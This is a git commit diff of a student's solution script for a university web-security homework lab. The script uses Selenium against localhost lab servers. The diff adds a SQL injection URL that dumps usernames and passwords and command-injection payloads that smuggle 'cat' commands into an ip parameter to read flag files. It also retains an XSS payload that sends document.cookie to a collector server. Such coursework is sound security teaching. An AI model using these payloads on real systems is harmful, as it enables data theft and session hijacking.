6526ca26404fe6412fc427918a77f42303758429
Ant <ant@cs.columbia.edu>
2018-10-29 19:28:40 -0400

    finished sql and command injection

--- Security/HW_2/student/client.py
+++ Security/HW_2/student/client.py
@@ -59,7 +59,6 @@ def xss(vuln_type, level):
         url = 'http://localhost:1337/xss/3/high?lang=%3Cbody%20onload=$.ajax({url:%22http://localhost:1338/xss/DOM_high?cookie=%22.concat(document.cookie)});%3E%3C/body%3E'
         driver.get(url)
 
-
     # Grader verification should be done in attacker_server/server.py
 
     driver.quit() # Closes the browser
@@ -70,18 +69,36 @@ def sql():
     driver = webdriver.Firefox(options=options)
 
     # URL to get passwords http://localhost:1337/sql_injection/low/id/1'%20or%20'1'%20=%20'1'%20union%20select%20id,%20name,%20surname,%20password%20from%20'users
-    driver.get(TARGET_SERVER_ENDPOINT)
+    url = "http://localhost:1337/sql_injection/low/id/1'%20or%20'1'%20=%20'1'%20union%20select%20id,%20name,%20surname,%20password%20from%20'users"
+    driver.get(url)
 
     soup = BeautifulSoup(driver.page_source) # Get the page contents and use for parsing.
     tr_elements = soup.find_all('tr') # Refer to the BeautifulSoup documentation for more details.
 
+    # hard coding this because too lazy to make generic solution
+    passwords = []
+    usernames = []
+    for ind, row in enumerate(tr_elements):
+        if(ind == 1 or ind == 3 or ind == 6):
+            splt = str(row).split()
+            password = splt[4]
+            password = password.replace('<td>', '')
+            password = password.replace('</td>', '')
+            passwords.append(password)
+        if(ind == 2 or ind == 4 or ind == 5):
+            splt = str(row).split()
+            username=splt[2]
+            username = username.replace('<td>', '')
+            username = username.replace('</td>', '')
+            usernames.append(username)
 
     # TODO: Populate the user_pass_list
-    # user_pass_list = [] # Where this should be a list of lists for containing the users and passwords
-                        # eg. [['username', 'password']]
+    user_pass_list = [] # Where this should be a list of lists for containing the users and passwords
+    # eg. [['username', 'password']]
+    for x in range(len(usernames)):
+        user_pass_list.append([usernames[x], passwords[x]])
 
-
-    # grader.sql_verify('low', user_pass_list)
+    grader.sql_verify('low', user_pass_list)
 
     driver.quit()
 
@@ -91,14 +108,46 @@ def command_injection(level):
     options.add_argument("--headless")
     driver = webdriver.Firefox(options=options)
 
+    # ASSUMING SERVER IS RUN FROM STUDENT DIRECTORY
+    if level == 'low':
+        url = "http://localhost:1337/command_injection/low?ip=example.com;cat%20./server/flags/low.txt%20|%20base64%20-d"
+        driver.get(url)
+        soup = BeautifulSoup(driver.page_source, 'html.parser')
+        output = soup.find(id='output')
+        # print(output)
+        # Hard coding this because too lazy for generic solution
+        splt = str(output).split('\n')
+        flag = splt[-2]
+        flag = flag.replace('<br/>', '')
+        flag = flag.strip()
+    if level == 'medium':
+        url = "http://localhost:1337/command_injection/medium?ip=%20]%20%20||%20%20cat%20./server/flags/medium.txt%20|%20base64%20-d"
+        driver.get(url)
+        soup = BeautifulSoup(driver.page_source, 'html.parser')
+        output = soup.find(id='output')
+        # print(output)
+        # Hard coding this because too lazy for generic solution
+        splt = str(output).split('\n')
+        flag = splt[-2]
+        flag = flag.replace('<br/>', '')
+        flag = flag.strip()
+
+    if level == 'high':
+        url = "http://localhost:1337/command_injection/high?ip=;cat%3C./server/flags/high.txt"
+        driver.get(url)
+        soup = BeautifulSoup(driver.page_source, 'html.parser')
+        output = soup.find(id='output')
+        # print(output)
+        # Hard coding this because too lazy for generic solution
+        splt = str(output).split('\n')
+        flag64 = splt[-2]
+        flag64 = flag64.replace('<br/>', '')
+        flag64 = flag64.strip()
+        flag = str(base64.b64decode(flag64), 'utf-8')
+
     # NOTE: Remember to decode the flag before sending it to the grader.
-    # grader.command_injection_verify(level, flag)
-    # Request url for low level
-    # http://localhost:1337/command_injection/low?ip=example.com;cat%20./server/flags/low.txt%20|%20base64%20-d
-    # Request url for medium level
-    # http://localhost:1337/command_injection/medium?ip=%20]%20%20||%20%20cat%20./server/flags/medium.txt%20|%20base64%20-d
-    # Request url for high level
-    # http://localhost:1337/command_injection/high?ip=;cat%3Cstudent/server/flags/high.txt
+    grader.command_injection_verify(level, flag)
+
     driver.quit()
 
 def csrf(level):
@@ -121,13 +170,13 @@ if __name__ == '__main__':
 
     # Commenting out this code until this piece is implemented
     # for level in ['low', 'medium', 'high']:
-    #     command_injection(level)
-
+        # command_injection(level)
+    #
     # sql()
 
     for vuln_type in ['1', '2', '3']:
         for level in ['low', 'medium', 'high']:
             xss(vuln_type, level)
-    #
+
     # for level in ['low', 'medium', 'high']:
     #     csrf(level)
